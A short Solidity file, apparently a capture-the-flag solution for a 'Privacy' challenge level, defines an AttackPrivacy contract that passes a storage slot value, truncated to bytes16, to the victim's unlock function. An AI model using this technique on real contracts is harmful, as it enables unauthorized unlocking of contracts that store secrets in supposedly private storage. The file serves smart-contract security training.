// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import './Privacy.sol';
contract AttackPrivacy {

    Privacy public victim;

    constructor (address _victimAddr){
        victim = Privacy(_victimAddr);
    }

    function attackAndUnlock(bytes32 _slotValue) public {
        victim.unlock(bytes16(_slotValue));
    }

}